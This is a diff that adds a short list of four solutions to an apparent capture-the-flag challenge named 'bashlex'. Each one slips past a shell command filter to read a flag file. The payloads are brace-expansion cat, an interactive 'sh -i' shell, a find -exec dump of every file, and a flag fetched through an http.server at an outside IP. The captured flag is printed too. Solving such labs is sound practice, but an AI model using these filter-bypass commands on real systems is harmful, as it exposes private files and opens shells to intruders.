@@ -1,0 +1,16 @@
+========= Solution 1 =========
+
+``cat /home/bashlex/fla{f..h}.txt``
+	cat: /home/bashlex/flaf.txt: No such file or directory
+	union{chomsky_go_lllllllll1}
+	cat: /home/bashlex/flah.txt: No such file or directory
+
+========= Solution 2 =========
+X=1 sh -i
+
+========= Solution 3 =========
+``find /home/bashlex/ -type f -printf "\n%p\n" -exec cat {} \;``
+
+========= Solution 4 =========
+python3 -m http.server 9001
+curl http://34.90.44.21:9001/home/bashlex/flag.txt
